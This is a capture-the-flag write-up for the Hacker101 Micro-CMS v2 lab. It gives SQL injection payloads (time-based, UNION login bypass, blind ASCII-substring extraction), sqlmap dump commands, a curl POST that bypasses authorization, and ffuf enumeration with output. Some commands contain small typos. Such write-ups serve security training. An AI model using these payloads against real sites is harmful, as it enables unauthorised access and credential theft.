# Micro-CMS v2 Write-up (Hacker101 CTF)
---
> [!TIP]
> If you are new to Capture-The-Flag challenges as I was when I began this series of challenges, for this challenge it will help to check out the [XSS and Authorization](https://www.hacker101.com/sessions/xss) session and the [SQL Injection and Friends](https://www.hacker101.com/sessions/sqli) session from the Hacker101 course material.
---
## Flag0
Initially, I could not figure out for the life of me what the table might be named that I would be looking for. I started by determining the *length of the table name*.
To determine the length of the database(# of characters), test various different numbers in place of '`X`'. If the length is *correct*, the `SLEEP` command will execute, and the response time of the page will demonstrate this:
```
2’ AND LENGTH(DATABASE())=X AND SLEEP(5)#
```
Very shortly thereafter, I abandoned my plan to manually determine the name in favour of a more automated method. I was able to determine the name of some tables in the database. Most significantly the name -- **`admins`**. The following was used in **sqlmap** in the terminal:
```
sqlmap -u 'https://<MACHINE_ID>.ctf.hacker101.com/login' --data "username=&password=" -dump
```

Now that I know the name of the table, I inject SQL into the **Username** field with a password *to force* copied into the **Password** field:
```
username=admin' UNION SELECT 'YourChosenPassword' AS password FROM admins WHERE '1' = '1
```

## Flag1
```HINTS
- What actions could you perform as a regular user on the last level, which you can't now?
- Just because request fails with one method doesn't mean it will fail with a different method
- Different requests often have different required authorization
```

**Bypass Authentication using `curl` to send a `POST` request to the page authentication is required on:**
	`# curl -v -X POST https://<MACHINE_ID>.ctf.hacker101.com/page/edit/1`
	Returns  `HTTP/2 200` response code, and the flag.
 
## Flag2
```HINTS
- Credentials are secret, flags are secret. Coincidence?
```

With *secrets* in mind, I began by searching for any *secret pages* among numerically named pages:
```ZSH
$ seq 50 > range.txt
$ ffuf -w range.txt -u https://<MACHINE_ID>.ctf.hacker101.com/page/FUZZ

________________________________________________

 :: Method           : GET
 :: URL              : https://<MACHINE_ID>.ctf.hacker101.com/page/FUZZ
 :: Wordlist         : FUZZ: /Users/deyl64/range.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

2                       [Status: 200, Size: 469, Words: 67, Lines: 16, Duration: 290ms]
1                       [Status: 200, Size: 574, Words: 111, Lines: 15, Duration: 61ms]
3                       [Status: 403, Size: 213, Words: 23, Lines: 6, Duration: 5222ms]
:: Progress: [50/50] :: Job [1/1] :: 9 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
There is now a page `3`, which was not evident before.  Page `1` and `2` were the default pages created in the past when making new pages.  Attempting to access page `3` shows that it is forbidden as authentication is needed.

##### Determining the Username
The username can be found by using `ffuf`:
	`ffuf -w $WORDLIST -u https://<MACHINE_ID>.ctf.hacker101.com/login\?username\=FUZZ  -X POST -v  -fr "Unknown user"`

##### Cracking Credentials with SQLMap
You can use the following command to find the credentials.
	`sqlmap -u "https://https://<MACHINE_ID>.ctf.hacker101.com/login" --data "username=abc&password=xyz" -p username --dbms=mysql --dump`

In this case, having designated the SQLi-vulnerable `username` parameter as the one to be tested (using `sqlmap`'s  `-p` option), the credentials are successfully cracked as shown by the output below:
```zsh
Database: level2
Table: admins
[1 entry]
+----+----------+------------+
| id | password | username   |
+----+----------+------------+
| 1  | chere    | georgianna |
+----+----------+------------+
```

##### Cracking the Credentials: Manual Method 
In order to determine what each character of *either* the `Username` or `Password` is, the following code can be used. The main idea is that you can use a comparison in the username and if it is true, you will get one error ("Invalid password") and if it is false you will get another ("unknown user"). So you can keep giving it comparisons and check the error result to find if it is true or not.

If the statement regarding the ASCII value of the character in the specific position is `TRUE`, the error `Invalid Password` will be displayed; however, if the statement is `FALSE`, the error `Unknown user` will be displayed:
	`username=' OR Ascii(substring(username,1,1)) > 115;- -password=`

```EXAMPLE
username=' OR 1=1;- -&password=
	This is true and therefore it passes the username check but fails the password check, resulting in "Invalid password"

username=' OR 1=2;- -&password=
	This is false and therefore fails the username check, resulting in "Unknown user".

Solving the username first:
username=' OR Ascii(substring(username,1,1)) > 109;- -  
password=
	(Ascii(substring(n,n)) returns the ascii character code of the nth character in the string)
	If the first letter of the username ascii code is greater than 109 (which is the letter 'm'), then the comparison will be true and it will tell me "Invalid password" as the error. Next, try:

username=' OR Ascii(substring(username,1,1)) > 115;- -  
password=
	If the character is not greater 115 (the letter 's') the comparison will be false and it will give the "Unknown user" error instead. Now I know the the letter is greater than 'm' and not greater than 's', therefore it is between 'n' and 's'. You continue these comparisons until you find the exact letter. Then you move onto the next character.

username=' OR Ascii(substring(username,2,2)) > 109;- -  
password=
	Now you're checking if the second character is greater than 109 ('m'). Once you find a character that equals 0, you know you have hit the end of the string.


REPEAT THE SAME PROCESS FOR THE PASSWORD:

username=' OR Ascii(substring(password,1,1)) > 109;- -  
password=

Burp Suite can be used for this manually, but you could write a script that did this faster using a binary search for each letter and just checking whether the response has "Invalid password" or "Unknown user" in it.
```
